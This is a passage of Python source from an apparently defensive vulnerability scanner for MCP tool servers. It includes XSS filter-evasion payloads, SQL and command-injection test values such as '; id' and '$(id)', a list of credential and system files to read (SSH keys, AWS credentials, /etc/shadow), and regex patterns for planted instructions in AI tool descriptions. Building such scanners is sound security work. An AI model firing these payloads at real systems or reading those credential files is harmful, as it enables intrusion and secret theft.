    ]
    
    if any(re.search(pattern, response_text) for pattern in injection_indicators):
        return True
        
    return False

async def probe_sql_injection(mcp_client: Any, tool: Dict[str, Any], use_dynamic: bool = False) -> Dict[str, Any]:
    """Probe for SQL injection vulnerabilities in tool parameters."""
    result = ProbeResult(
        probe_type=ProbeType.SQL_INJECTION,
        severity="high",
        confidence=0.0,
        attempts=[]
    )
    
    # Get tool parameters
    params = tool.get('parameters', {})
    if not params:
        result.proof = "No parameters found to test for SQL injection"
        return result.to_dict()
    
    # Find parameters that might be vulnerable to SQLi
    sql_params = []
    for param_name, param_schema in params.items():
        param_type = get_parameter_type(param_name, param_schema)
        if param_type in [ParameterType.SQL_QUERY, ParameterType.SQL_FILTER, ParameterType.SEARCH, ParameterType.ID]:
            sql_params.append((param_name, param_type))
    
    if not sql_params:
        result.proof = "No SQL-related parameters found to test"
        return result.to_dict()
    
    # Test each vulnerable parameter
    for param_name, param_type in sql_params:
        for payload in SQLI_TEST_PAYLOADS:
            attempt = {
                "param": param_name,
                "payload": payload,
                "classification": "pending"
            }
            
            try:
                # Create payload with the test SQLi attempt
                test_payload = {param_name: payload}
                
                # Add other required parameters with default values
                for req_param in params.keys():
                    if req_param != param_name and req_param not in test_payload:
                        test_payload[req_param] = "test"  # Default test value
                
                # Call the tool with the test payload
                resp = await call_tool_with_client(mcp_client, tool['name'], test_payload)
                response_text = extract_result_text(resp) if resp else ""
                
                # Analyze the response
                is_vulnerable = await analyze_sql_injection_response(response_text)
                
                if is_vulnerable:
                    result.success = True
                    result.confidence = 0.9  # High confidence if we get a clear SQL error
                    result.payload = {param_name: payload}
                    result.proof = json.dumps({
                        "parameter": param_name,
                        "payload": payload,
                        "response": limit_lines(response_text, max_lines=5, max_chars=500)
                    }, ensure_ascii=False)
                    
                    logging.warning(
                        f"SQL injection vulnerability found in {tool.get('name', 'unknown')} "
                        f"with parameter '{param_name}'"
                    )
                    
                    # Add the attempt and return the result
                    attempt["classification"] = "vulnerable"
                    attempt["response"] = limit_lines(response_text, max_lines=2, max_chars=200)
                    result.attempts.append(attempt)
                    
                    return result.to_dict()
                else:
                    attempt["classification"] = "safe"
                    
            except Exception as e:
                error_msg = str(e).lower()
                if 'validation' in error_msg or 'field required' in error_msg:
                    attempt["classification"] = "invalid_parameter"
                else:
                    attempt["classification"] = "error"
                    attempt["error"] = str(e)
                    logging.warning(
                        f"Error testing SQL injection on {tool.get('name', 'unknown')} "
                        f"with parameter '{param_name}': {e}",
                        exc_info=logging.DEBUG >= logging.root.level
                    )
            
            result.attempts.append(attempt)
    
    # If we get here, no SQL injection was found
    result.success = False
    result.proof = "No SQL injection vulnerabilities found"
    return result.to_dict()

# XSS detection patterns and test payloads
XSS_TEST_PAYLOADS = [
    # Basic XSS
    '<script>alert(1)</script>',
    '<img src="x" onerror="alert(1)">',
    '<svg onload="alert(1)">',
    '<body onload=alert(1)>',
    
    # OWASP XSS Filter Evasion Cheat Sheet examples
    '<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>',
    '<IMG SRC=JaVaScRiPt:alert(1)>',
    '<IMG SRC=javascript:alert("XSS")>',
    "<IMG SRC=javascript:alert('RSnake says, XSS')>",
    '<IMG """><SCRIPT>alert("XSS")</SCRIPT>">',
    '<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>',
    
    # Event handlers
    '" onmouseover=alert(1) x="',
    '" onfocus=alert(1) autofocus="',
    '" onload=alert(1) src="',
    
    # Encoded payloads
    '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
    '%3Cscript%3Ealert(1)%3C/script%3E',
    
    # DOM-based XSS
    '#<script>alert(1)</script>',
    'javascript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    
    # Special characters
    '<>\'\";alert(1)//',
    '\'><script>alert(1)</script>',
    '"><script>alert(1)</script>',
    
    # Bypass filters
    '<scr<script>ipt>alert(1)</scr</script>ipt>',
    '<scr<script>ipt>alert(1)</script>',
    '<scr<script>ipt>alert(1)</scr<scr</script>ipt>ipt>',
]

XSS_DETECTION_PATTERNS = [
    # Script tags and event handlers
    r'<script[^>]*>',
    r'javascript:',
    r'on\w+\s*=',
    
    # HTML tags that can execute JavaScript
    r'<img[^>]*>',
    r'<svg[^>]*>',
    r'<body[^>]*>',
    r'<iframe[^>]*>',
    r'<object[^>]*>',
    r'<embed[^>]*>',
    r'<applet[^>]*>',
    r'<style[^>]*>',
    r'<link[^>]*>',
    r'<meta[^>]*>',
    r'<form[^>]*>',
    r'<input[^>]*>',
    r'<button[^>]*>',
    r'<select[^>]*>',
    r'<textarea[^>]*>',
    r'<video[^>]*>',
    r'<audio[^>]*>',
    r'<source[^>]*>',
    r'<track[^>]*>',
    r'<canvas[^>]*>',
    r'<math[^>]*>',
    r'<marquee[^>]*>',
    r'<frameset[^>]*>',
    r'<frame[^>]*>',
    r'<base[^>]*>',
    r'<blink[^>]*>',
    r'<isindex[^>]*>',
    r'<a[^>]*>',
    r'<div[^>]*>',
    r'<span[^>]*>',
    r'<table[^>]*>',
    r'<td[^>]*>',
    r'<tr[^>]*>',
    r'<th[^>]*>',
    r'<ilayer[^>]*>',
    r'<layer[^>]*>',
    r'<bgsound[^>]*>',
    r'<command[^>]*>',
    r'<details[^>]*>',
    r'<keygen[^>]*>',
    r'<menuitem[^>]*>',
    r'<wbr[^>]*>',
    r'<xss[^>]*>',
]

async def analyze_xss_response(response: Any, payload: str) -> bool:
    """Analyze response for signs of successful XSS."""
    if not response:
        return False
    
    response_text = str(response)
    
    # Check if the payload appears in the response (unescaped)
    # We look for the payload with HTML special characters unescaped
    if payload in response_text:
        return True
    
    # Check for common XSS patterns in the response
    if any(re.search(pattern, response_text, re.IGNORECASE) for pattern in XSS_DETECTION_PATTERNS):
        return True
    
    # Check for common XSS strings in the response
    xss_indicators = [
        'alert(', 'prompt(', 'confirm(',
        'onerror=', 'onload=', 'onclick=', 'onmouseover=',
        'javascript:', 'vbscript:', 'data:',
        '<script>', '</script>',
        '<img ', '<svg ', '<body ', '<iframe '
    ]
    
    if any(indicator in response_text.lower() for indicator in xss_indicators):
        return True
    
    return False

async def probe_xss(mcp_client: Any, tool: Dict[str, Any], use_dynamic: bool = False) -> Dict[str, Any]:
    """Probe for Cross-Site Scripting (XSS) vulnerabilities in tool parameters."""
    result = ProbeResult(
        probe_type=ProbeType.XSS,
        severity="high",
        confidence=0.0,
        attempts=[]
    )
    
    # Get tool parameters
    params = tool.get('parameters', {})
    if not params:
        result.proof = "No parameters found to test for XSS"
        return result.to_dict()
    
    # Find parameters that might be vulnerable to XSS
    xss_params = []
    for param_name, param_schema in params.items():
        param_type = get_parameter_type(param_name, param_schema)
        if param_type in [ParameterType.HTML_INPUT, ParameterType.SEARCH, ParameterType.URL, ParameterType.GENERIC]:
            xss_params.append((param_name, param_type))
    
    if not xss_params:
        result.proof = "No XSS-vulnerable parameters found to test"
        return result.to_dict()
    
    # Test each vulnerable parameter
    for param_name, param_type in xss_params:
        for payload in XSS_TEST_PAYLOADS:
            attempt = {
                "param": param_name,
                "payload": payload,
                "classification": "pending"
            }
            
            try:
                # Create payload with the test XSS attempt
                test_payload = {param_name: payload}
                
                # Add other required parameters with default values
                for req_param in params.keys():
                    if req_param != param_name and req_param not in test_payload:
                        test_payload[req_param] = "test"  # Default test value
                
                # Call the tool with the test payload
                resp = await call_tool_with_client(mcp_client, tool['name'], test_payload)
                response_text = extract_result_text(resp) if resp else ""
                
                # Analyze the response
                is_vulnerable = await analyze_xss_response(response_text, payload)
                
                if is_vulnerable:
                    result.success = True
                    result.confidence = 0.9  # High confidence if we see the payload reflected
                    result.payload = {param_name: payload}
                    result.proof = json.dumps({
                        "parameter": param_name,
                        "payload": payload,
                        "response": limit_lines(response_text, max_lines=5, max_chars=500)
                    }, ensure_ascii=False)
                    
                    logging.warning(
                        f"XSS vulnerability found in {tool.get('name', 'unknown')} "
                        f"with parameter '{param_name}'"
                    )
                    
                    # Add the attempt and return the result
                    attempt["classification"] = "vulnerable"
                    attempt["response"] = limit_lines(response_text, max_lines=2, max_chars=200)
                    result.attempts.append(attempt)
                    
                    return result.to_dict()
                else:
                    attempt["classification"] = "safe"
                    
            except Exception as e:
                error_msg = str(e).lower()
                if 'validation' in error_msg or 'field required' in error_msg:
                    attempt["classification"] = "invalid_parameter"
                else:
                    attempt["classification"] = "error"
                    attempt["error"] = str(e)
                    logging.warning(
                        f"Error testing XSS on {tool.get('name', 'unknown')} "
                        f"with parameter '{param_name}': {e}",
                        exc_info=logging.DEBUG >= logging.root.level
                    )
            
            result.attempts.append(attempt)
    
    # If we get here, no XSS was found
    result.success = False
    result.proof = "No XSS vulnerabilities found"
    return result.to_dict()

async def analyze_file_read_response(response: Any, test_file: str) -> bool:
    """Analyze response for signs of successful file read."""
    if not response:
        return False
    
    response_text = str(response).lower()
    
    # Common file content patterns
    file_patterns = {
        '/etc/passwd': ['root:', 'nobody:'],
        '/etc/hosts': ['localhost', '127.0.0.1'],
        '/etc/group': ['root:', 'wheel:', 'sudo:'],
        'win.ini': ['[extensions]', '[mci extensions]'],
    }
    
    # Check for known file content
    for file_pattern, patterns in file_patterns.items():
        if file_pattern in test_file:
            if any(pattern in response_text for pattern in patterns):
                return True
    
    # Check for common error messages that indicate file access
    error_indicators = [
        'permission denied', 'permissionerror', 'filenotfound', 'no such file',
        'eacces', 'eperm', 'eio', 'enotdir', 'eisdir', 'enotempty', 'enospc',
        'enomem', 'eexist', 'ebadf', 'einval', 'enametoolong', 'eloop',
        'enotblk', 'enodev', 'enxio', 'eoverflow', 'erofs', 'espipe', 'esrch',
        'etxtbsy', 'ewouldblock', 'eagain'
    ]
    
    # If we get an error message that includes the filename, it might be vulnerable
    if any(indicator in response_text for indicator in error_indicators) and test_file.lower() in response_text.lower():
        return True
    
    return False

@register_probe(ProbeType.FILE_READ)
async def probe_file_read(mcp_client: Any, tool: Dict[str, Any], use_dynamic: bool = False, param_types: Optional[Dict[str, ParameterType]] = None) -> Dict[str, Any]:
    """Probe for file read vulnerabilities, targeting only filepath parameters."""
    result = ProbeResult(probe_type=ProbeType.FILE_READ, severity="high")
    result.attempts = []

    # Only test files that are likely to exist and contain sensitive information
    test_files = [
        # Common Unix/Linux sensitive files
        "/etc/passwd",
        "/etc/shadow",
        "/etc/group",
        "/etc/hosts",
        "/etc/issue",
        "/etc/motd",
        "/etc/resolv.conf",
        "/etc/ssh/sshd_config",
        "/etc/sudoers",
        
        # Common Windows sensitive files
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "C:\\Windows\\win.ini",
        "C:\\Windows\\System.ini",
        "C:\\boot.ini",
        
        # Common log files that might leak information
        "/var/log/auth.log",
        "/var/log/syslog",
        "/var/log/secure",
        "C:\\Windows\\System32\\LogFiles\\HTTPERR\\httperr1.log",
        
        # Common configuration files
        "~/.ssh/authorized_keys",
        "~/.ssh/id_rsa",
        "~/.aws/credentials",
        "~/.docker/config.json",
        
        # Common environment files
        "/proc/self/environ",
        "/proc/self/cmdline",
    ]

    # Get schema from tool
    schema = tool.get('inputSchema', {})
    properties = schema.get('properties', {})
    
    # If no param_types provided, determine them
    if param_types is None:
        param_types = {name: get_parameter_type(name, prop) for name, prop in properties.items()}
    
    # Only test parameters that are likely to be file paths
    target_params = [name for name, ptype in param_types.items() 
                    if ptype == ParameterType.FILEPATH or 
                       (ptype == ParameterType.GENERIC and 'path' in name.lower())]
    
    if not target_params:
        result.success = False
        result.proof = "No filepath parameters found to test"
        return result.to_dict()

    # Test each target parameter
    for param_name in target_params:
        for test_file in test_files:
            try:
                # Create payload with test file
                payload = {p: "test" for p in properties}  # Default values
                payload[param_name] = test_file
                
                # Execute the tool with the test payload
                response = await mcp_client.execute_tool(tool['name'], payload)
                
                # Analyze response for signs of file read
                is_vulnerable = await analyze_file_read_response(response, test_file)
                
                attempt = {
                    "param": param_name,
                    "payload": test_file,
                    "vulnerable": is_vulnerable,
                    "response": str(response)[:500]  # Truncate long responses
                }
                result.attempts.append(attempt)
                
                if is_vulnerable:
                    result.success = True
                    result.proof = f"File read vulnerability found in parameter '{param_name}' with payload '{test_file}'"
                    return result.to_dict()
                    
            except Exception as e:
                logging.warning(f"Error testing file read on {param_name}: {str(e)}")
                result.attempts.append({
                    "param": param_name,
                    "payload": test_file,
                    "error": str(e)
                })

    result.success = False
    result.proof = "No file read vulnerabilities found"
    return result.to_dict()


def is_suspicious_behavior(tool_name: str, tool_desc: str, input_payload: Any, output_text: str) -> bool:
    """
    Detect if a tool is showing behavior that doesn't match its stated purpose.
    Returns True if the behavior is suspicious/indicative of tool poisoning.
    Uses contextual analysis to detect anomalies in tool behavior.
    """
    if not output_text or not isinstance(output_text, str):
        return False
    
    output_lower = output_text.lower()
    output_stripped = output_text.strip()
    tool_desc_lower = (tool_desc or "").lower()
    
    # First, check for obviously safe outputs
    if not output_stripped:  # Empty output is not suspicious
        return False
        
    # Check for suspicious patterns in tool description that indicate hidden behavior
    # NOTE: We no longer use description matches alone to flag behavioral suspicion.
    #       Description sensitivity is reported separately during probe aggregation.
    suspicious_desc_patterns = [
        # Hidden instructions to access confidential data
        r'<IMPORTANT>.*?company://confidential',
        r'<HIDDEN>.*?confidential',
        r'override[-_]auth[-_]protocol[-_]?\d+',
        r'secret.*?authorization',
        r'bypass.*?security',
        r'internal.*?only',
        # Suspicious URL patterns
        r'\b(?:[a-z]+://|@|\[\s*["\']?)(?:localhost|127\.0\.0\.1|internal[^\s"\]]+)[^\s"\]]*',
        # Hardcoded credentials or tokens
        r'(?:password|passwd|pwd|token|key|secret)[\s=:]+[\'"][^\s"\']+[\'"]',
        # Suspicious file access patterns
        r'\b(?:file|read|access)[^\n]*\b(?:/etc/passwd|/etc/shadow|~\.ssh|C:\\Windows\\System32)\\',
        # Suspicious command execution patterns
        r'\b(?:exec|eval|system|subprocess|os\.popen|os\.system)\s*\(',
        # Hidden backdoor patterns
        r'\b(?:backdoor|malicious|hidden|undocumented|secret)\b.*?\b(?:functionality|behavior|code)\b',
        # Data exfiltration patterns
        r'\b(?:send|exfiltrate|leak|upload)[^\n]*\b(?:data|info|credentials)\b'
    ]
    
    # Do not mark as suspicious based solely on description content to avoid false positives
    # if any(re.search(pattern, tool_desc_lower, re.DOTALL | re.IGNORECASE) for pattern in suspicious_desc_patterns):
    #     logging.warning(f"Sensitive pattern found in tool description for {tool_name}")
    #     return True
    
    # Get tool purpose for better classification
    tool_purpose = f"{tool_name} {tool_desc}".lower()
    
    # Only define categories for tools that might be present on the server
    # This helps with categorizing the actual tools, not for testing non-existent ones
    tool_categories = {
        'sse_tool': ['sse_tool'],
        'file': ['file/read', 'file_read', 'read_file'],
        'system': ['system/exec', 'exec', 'execute', 'command']
    }
    
    # Determine tool category
    tool_category = None
    for category, keywords in tool_categories.items():
        if any(keyword in tool_purpose for keyword in keywords):
            tool_category = category
            break
    
    # Define expected output patterns for each category
    expected_patterns = {
        'greeting': [
            r'^[\w\s\-!,\.?]+$',  # Basic text with common punctuation
            r'^\s*Hello,\s*[^\n]*!?\s*$',
            r'^\s*Hi\b[^\n]*$',
            r'^\s*Welcome\b[^\n]*$',
            r'^\s*Greetings?\b[^\n]*$'
        ],
        'calculator': [
            r'^[\d\s\+\-\*/\.=()]+$',  # Basic math expressions
            r'^\s*[0-9]+(?:\.[0-9]+)?\s*$',  # Simple number
            r'^\s*[0-9]+(?:\.[0-9]+)?\s*[+\-*/]\s*[0-9]+(?:\.[0-9]+)?\s*=\s*[0-9]+(?:\.[0-9]+)?\s*$',
            r'^\s*[-+]?\d*\.?\d+\s*$'  # Any number
        ],
        'time': [
            r'^\s*\d{1,2}:\d{2}(?::\d{2})?\s*(?:[AP]M)?\s*$',  # Time format
            r'^\s*\d{4}-\d{2}-\d{2}(?:[T ]\d{2}:\d{2}(?::\d{2}(?:\.\d+)?)?(?:Z|[+-]\d{2}:?\d{2})?)?\s*$',
            r'^\s*(?:Mon|Tue|Wed|Thu|Fri|Sat|Sun)[a-z]*,?\s+[A-Za-z]+\s+\d{1,2},\s+\d{4}(?:\s+\d{1,2}:\d{2}(?::\d{2})?\s*(?:[AP]M)?)?\s*$',
            r'^\s*\d{1,2}/\d{1,2}/\d{2,4}(?:\s+\d{1,2}:\d{2}(?::\d{2})?\s*(?:[AP]M)?)?\s*$',
            r'^[\d\s\-:APMapm/,]+$'  # General time/date characters
        ],
        'echo': [
            r'^.{0,500}$'  # Simple text response up to 500 chars
        ]
    }
    
    # If we know the tool's category, check if output matches expected patterns
    if tool_category and tool_category in expected_patterns:
        if any(re.match(p, output_text, re.IGNORECASE) for p in expected_patterns[tool_category]):
            return False  # Output matches expected patterns for this tool type
    
    # Check for clear indicators of command execution in output
    command_execution_indicators = [
        # System information patterns
        r'\b(?:uid|gid|groups?)=\d+',
        r'\b(?:user|username|hostname)\s*[:=]\s*[^\s\n]+',
        r'\b(?:home|pwd|path)\s*[:=]\s*[^\s\n]+',
        
        # Common command output patterns
        r'\b(?:drwx[rwx-]+\s+\d+\s+\w+\s+\w+\s+\d+\s+[^\n]+)',  # ls -l output
        r'\b(?:total \d+|total \d+\s+\d+)',  # du/ls -l header
        r'\b(?:Filesystem|Size|Used|Avail|Use%|Mounted on)\b',  # df output
        r'\b(?:Active|Connections|Proto|Recv-Q|Send-Q|Local Address|Foreign Address|State)\b',  # netstat/ss output
        
        # Shell prompt patterns
        r'\[?\w+@[\w-]+\s[^\s]+\]?[\$#]\s*$',
        
        # Command output headers
        r'^\s*(?:PID\s+USER|USER\s+PID|COMMAND\s+PID|MEM\s+USAGE)',
    ]
    
    # Check for actual command execution evidence
    has_command_output = any(
        re.search(p, output_text, re.IGNORECASE) 
        for p in command_execution_indicators
    )
    
    # Check for suspicious input patterns
    suspicious_input = False
    if input_payload:
        input_str = str(input_payload).lower()
        suspicious_input = any(
            re.search(p, input_str, re.IGNORECASE) 
            for p in command_execution_indicators
        )
    
    # If we have both suspicious input and command output, it's definitely suspicious
    if suspicious_input and has_command_output:
        return True
    
    # Check for specific security-sensitive patterns in output
    security_patterns = [
        # System files and sensitive data
        r'\b(?:passwd|shadow|group)\s*:',  # /etc/passwd or /etc/group format
        r'\b(?:ssh|rsa|dsa|ecdsa|ed25519)[-\s]*(?:key|id)[^\n]*-----',  # Private keys
        r'\b(?:AWS_ACCESS_KEY|AWS_SECRET_KEY|API[_-]?KEY|SECRET[_-]?KEY|PASSWORD|TOKEN)\s*[:=]\s*[^\s\n]+',
        
        # Dangerous commands
        r'\b(?:rm\s+-[rf]|del\s+/[sq]|format\s+[^\s]+|shutdown\s+\-h|killall|pkill|taskkill)',
        r'\b(?:/etc/(?:passwd|shadow|group|hosts?)|C:\\Windows\\System32)\\',
        
        # Code execution patterns
        r'\b(?:eval\(|exec\(|os\.system\()',
        r'\b(?:subprocess\.run\(|subprocess\.Popen\()',
        r'\b(?:import\s+os\s*$|import\s+subprocess\s*$|import\s+sys\s*$)',
        r'\b(?:__import__\(|getattr\(|setattr\()',
        r'\b(?:open\([^)]*,[^)]*w[^)]*\))',  # File write operations
        
        # Suspicious patterns
        r'\b(?:<|>|\|)',  # Redirection/pipe characters
        r'\b(?:&&|\|\||;|`|\$\()',  # Command chaining/substitution
        r'\b(?:echo|print)\s+[^\n]*\$\{',  # Variable expansion
    ]
    
    if any(re.search(pattern, output_text, re.IGNORECASE) for pattern in security_patterns):
        return True
        
    # Contextual analysis based on tool type
    if tool_category == 'greeting':
        # For greeting tools, be very strict about allowed output
        if len(output_stripped) > 100:  # Unusually long greeting
            return True
            
        # Check for suspicious characters that shouldn't be in a greeting
        if any(c in output_text for c in '{}[]|;`$()'):
            return True
            
        # Check for code execution patterns
        if re.search(r'\b(?:echo|print|exec|system|os\.|subprocess\.|import\s+os|import\s+subprocess)\b', output_text):
            return True
            
    elif tool_category == 'calculator':
        # For calculator tools, first check if it's an error response
        try:
            # Check if the output is a JSON error response
            error_data = json.loads(output_text)
            if 'error' in error_data:
                # If it's a validation error about invalid input type, it's expected behavior
                error_msg = json.dumps(error_data['error']).lower()
                if 'invalid_type' in error_msg and 'expected number' in error_msg:
                    return False
        except (json.JSONDecodeError, TypeError):
            # Not a JSON error, continue with normal validation
            pass
            
        # For successful calculations, only allow basic math expressions and results
        if not re.match(r'^[\d\s\+\-\*/\.,=()]+$', output_stripped):
            # If it's not a simple math expression, check if it's a common error message
            if not any(msg in output_lower for msg in ['error', 'invalid', 'expected']):
                return True
            
    elif tool_category == 'time':
        # For time/date tools, only allow time/date related formats
        if not re.match(r'^[\d\s\-:APMapm/,]+$', output_stripped):
            return True
            
    elif tool_category == 'echo':
        # For echo tools, limit the length and check for suspicious patterns
        if len(output_stripped) > 1000:  # Very long echo response
            return True
            
        if any(c in output_text for c in '{}[]|;`$()'):
            return True
    
    # Check for suspicious patterns in the output that might indicate data leakage
    suspicious_output_patterns = [
        # Common sensitive data patterns (only if not in an error message)
        (r'\b(?:confidential|secret|internal|restricted|classified|proprietary)\b.*?\b(?:data|information|documents?|records?)\b', 
         lambda m: not any(e in output_lower for e in ['not found', 'error', 'invalid', 'failed'])),
        
        # Common credential patterns (only if not in an error message)
        (r'\b(?:password|token|key|secret)[\s=:]+[^\s\n]+', 
         lambda m: not any(e in output_lower for e in ['not found', 'error', 'invalid', 'failed'])),
        
        # Common internal URL patterns (must be a complete URL, not just part of an error message)
        (r'\b(?:https?://|www\.|api\.|internal\.|staging\.|dev\.|test\.)[^\s"\'<>]+\b', 
         lambda m: not any(e in output_lower for e in ['not found', 'error', 'invalid'])),
        
        # File paths in output (must be complete paths, not just parts of error messages)
        (r'\b(?:/etc/(?:passwd|shadow|hosts)|/root/|/home/[^/]+/|C:\\Windows\\)[^\s"\'<>]*\b', 
         lambda m: not any(e in output_lower for e in ['not found', 'no such', 'invalid', 'error'])),
        
        # Command output patterns (only if they look like actual command output, not error messages)
        (r'\b(?:uid|gid|user|group|hostname|pwd|path)[\s=:]+[^\s\n]+', 
         lambda m: not any(e in output_lower for e in ['not found', 'error', 'invalid'])),
        
        # Sensitive data patterns (only if they appear in a non-error context)
        (r'\b(?:ssn|social security|credit card|bank account|routing number|api[_-]?key|secret[_-]?key)\b', 
         lambda m: not any(e in output_lower for e in ['not found', 'error', 'invalid']))
    ]
    
    # Check if output contains any suspicious patterns with their conditions
    for pattern, condition in suspicious_output_patterns:
        if re.search(pattern, output_lower, re.IGNORECASE):
            if condition(None):  # Only log if condition is met
                logging.warning(f"Suspicious output pattern detected in {tool_name}: {pattern}")
                return True
    
    # For any tool, if we detected command output, it's suspicious
    return has_command_output


async def probe_exec(server: str, tool: Dict[str, Any], mcp_client, use_dynamic: bool = False, use_static: bool = False, use_prompt: bool = False) -> Dict[str, Any]:
    logging.debug(f"probe_exec called for server: {server}, tool: {tool.get('name', 'unknown')}")
    """
    Execute a tool with various payloads to test for command injection and tool poisoning.
    
    Args:
        server: Server name
        tool: Tool definition dictionary
        mcp_client: MCP client instance for making tool calls
        use_dynamic: Whether to use dynamic LLM-based payload generation
        
    Returns:
        Dictionary with probe results
    """
    tool_name = tool.get('name', '')
    tool_desc = tool.get('description', '')
    
    probe = {
        "success": False, 
        "payload": None, 
        "proof": None, 
        "response": None, 
        "attempts": [],
        "is_tool_poisoning": False
    }
    
    # Get tool metadata for better analysis
    tool_name = tool.get("name", "")
    tool_desc = tool.get("description", "")
    
    # Detect sensitive information in description (reported separately if behavior is safe)
    def _description_is_sensitive(desc: str) -> bool:
        desc_lower = (desc or "").lower()
        patterns = [
            r'<important>.*?company://confidential',
            r'<hidden>.*?confidential',
            r'override[-_]auth[-_]protocol[-_]?\d+',
            r'secret.*?authorization',
            r'bypass.*?security',
            r'internal.*?only',
        ]
        return any(re.search(p, desc_lower, re.DOTALL | re.IGNORECASE) for p in patterns)
    
    description_sensitive = _description_is_sensitive(tool_desc)
    
    # Generate payloads from LLM with the MCP client
    payloads_result = []
    
    # Only include prompt injection payloads if use_prompt is True
    if use_prompt or not any('prompt' in str(p).lower() for p in payloads_result):
        payloads_result = await generate_payloads(
            tool_name,
            tool_desc,
            tool.get("raw", {}).get("inputSchema", {}),
            mcp_client=mcp_client,
            use_llm=use_dynamic,
            use_static=use_static,
            use_prompt=use_prompt
        )
    
    if not payloads_result:
        return probe
        
    # Check if the tool is designed to execute commands
    is_command_tool = any(term in tool_name.lower() or term in tool_desc.lower()
                        for term in ['command', 'exec', 'shell', 'terminal', 'sh', 'bash', 'cmd', 'powershell', 'run'])
    
    # Add bash command execution tests for non-command tools
    is_number_tool = (not is_command_tool and 
                     any(term in tool_name.lower() or term in tool_desc.lower()
                         for term in ['add', 'sum', 'plus', 'calculator', 'number']))
    
    if is_number_tool and not is_command_tool:
        # Check if the tool expects a 'command' parameter or 'a' and 'b' parameters
        input_schema = tool.get("raw", {}).get("inputSchema", {})
        properties = input_schema.get("properties", {})
        # If schema wasn't present in the normalized tool, try fetching via client (stdio)
        if (not properties) and mcp_client and hasattr(mcp_client, 'get_tool_schema'):
            try:
                live_schema = await mcp_client.get_tool_schema(tool_name)
                if isinstance(live_schema, dict):
                    input_schema = live_schema.get("inputSchema", {}) or {}
                    properties = input_schema.get("properties", {}) or {}
            except Exception:
                properties = properties or {}
        
        if "command" in properties:
            # Tool expects a 'command' parameter
            bash_tests = [
                ({"command": "`id`"}, "Command substitution with backticks"),
                ({"command": "$(id)"}, "Command substitution with $()"),
                ({"command": "; echo vulnerable;"}, "Command chaining"),
                ({"command": "; id"}, "Command injection with semicolon"),
                ({"command": "1 || id"}, "OR operator command injection"),
                ({"command": "1 && id"}, "AND operator command injection"),
                ({"command": "1 | id"}, "Pipe operator command injection"),
                ({"command": "1 > /tmp/test; id"}, "Redirection and command execution"),
                ({"command": "1; id;"}, "Multiple commands with semicolon"),
                ({"command": "1 || { id; }"}, "Command grouping"),
                ({"command": "1 || $(id)"}, "OR with command substitution")
            ]
        else:
            # Tool expects 'a' and 'b' parameters (legacy format)
            bash_tests = [
                ({"a": "`id`", "b": 1}, "Command substitution with backticks"),
                ({"a": "$(id)", "b": 1}, "Command substitution with $()"),
                ({"a": "; echo vulnerable;", "b": 1}, "Command chaining"),
                ({"a": "; id", "b": 1}, "Command injection with semicolon"),
                ({"a": "1 || id", "b": 1}, "OR operator command injection"),
                ({"a": "1 && id", "b": 1}, "AND operator command injection"),
                ({"a": "1 | id", "b": 1}, "Pipe operator command injection"),
                ({"a": "1 > /tmp/test; id", "b": 1}, "Redirection and command execution"),
                ({"a": "1; id;", "b": 1}, "Multiple commands with semicolon"),
                ({"a": "1 || { id; }", "b": 1}, "Command grouping"),
                ({"a": "1 || $(id)", "b": 1}, "OR with command substitution")
            ]
        
        # Add bash tests to the beginning of the payloads
        for payload, _ in bash_tests:
            if not any(p.get("payload") == payload for p in payloads_result):
                payloads_result.insert(0, {"payload": payload, "is_bash_test": True})
    
    # Track suspicious behaviors across all attempts
    suspicious_behaviors = []
    
    for i, result in enumerate(payloads_result):
        if "payload" not in result:
            continue
            
        payload = result["payload"]
        attempt = {"args": payload, "resp_short": None, "classification": "pending"}
        
        # Add throttling to prevent overwhelming the server
        if i > 0 and i % 5 == 0:  # Add delay every 5 requests
            await asyncio.sleep(0.5)  # 500ms delay
        
        try:
            # Use call_tool_with_client which handles different calling patterns
            resp = await call_tool_with_client(mcp_client, tool_name, payload)
            if resp is None:
                attempt["classification"] = "no_response"
                probe["attempts"].append(attempt)
                continue
            
            if not resp:
                attempt["classification"] = "no_response"
                probe["attempts"].append(attempt)
                continue
                
            text = extract_result_text(resp)
            attempt["resp_short"] = str(text)[:200] if text else None
            
            # Check for suspicious behavior
            if text:
                is_suspicious = is_suspicious_behavior(tool_name, tool_desc, payload, text)
                if is_suspicious:
                    suspicious_behaviors.append({
                        "payload": payload,
                        "response": limit_lines(text, max_lines=2, max_chars=300),
                        "reason": "Tool behavior inconsistent with stated purpose"
                    })
            
            # Classify based on response
            if not text:
                attempt["classification"] = "no_output"
            elif "denied" in text.lower():
                attempt["classification"] = "denied"
            elif "invalid" in text.lower() or "error" in text.lower():
                attempt["classification"] = "error_response"
            else:
                attempt["classification"] = "success"
                
                # Only mark as success if we haven't detected suspicious behavior
                if not suspicious_behaviors:
                    # Create a properly structured proof object
                    proof_data = {
                        "tool_name": tool_name,
                        "tool_description": tool_desc,
                        "server": server,
                        "payload": payload,
                        "response": limit_lines(text, max_lines=2, max_chars=300),
                        "classification": "normal_behavior"
                    }
                    
                    probe.update(
                        success=True, 
                        payload=payload, 
                        proof=json.dumps(proof_data, indent=2, ensure_ascii=False),
                        response=resp
                    )
            
        except Exception as e:
            logging.error("Error in probe_exec for tool %s: %s", tool_name, str(e))
            attempt = {
                "args": payload, 
                "resp_short": str(e)[:200], 
                "classification": "error",
                "error": str(e)
            }
            
        probe["attempts"].append(attempt)
    
    # If we found suspicious behaviors, mark as tool poisoning
    if suspicious_behaviors:
        # Show only one representative proof entry instead of all suspicious behaviors
        representative_behavior = suspicious_behaviors[0]  # Take the first one as representative
        proof_data = {
            "representative_proof": {
                "payload": representative_behavior["payload"],
                "response": representative_behavior["response"],
                "reason": representative_behavior["reason"]
            }
        }
        
        try:
            proof_json = json.dumps(proof_data, indent=2, ensure_ascii=False)
        except (TypeError, ValueError) as e:
            logging.error(f"Failed to serialize proof data: {e}")
            # Fall back to a minimal valid JSON structure if serialization fails
            proof_json = json.dumps({
                "error": "Failed to serialize proof data",
                "tool_name": tool["name"],
                "server": server
            })
            
        probe.update(
            success=True,
            is_tool_poisoning=bool(suspicious_behaviors),  # Only mark as poisoning if we have behaviors
            proof=proof_json,
            payload=suspicious_behaviors[0]["payload"] if suspicious_behaviors else None
        )
        logging.warning("Potential tool poisoning detected in %s: %s", 
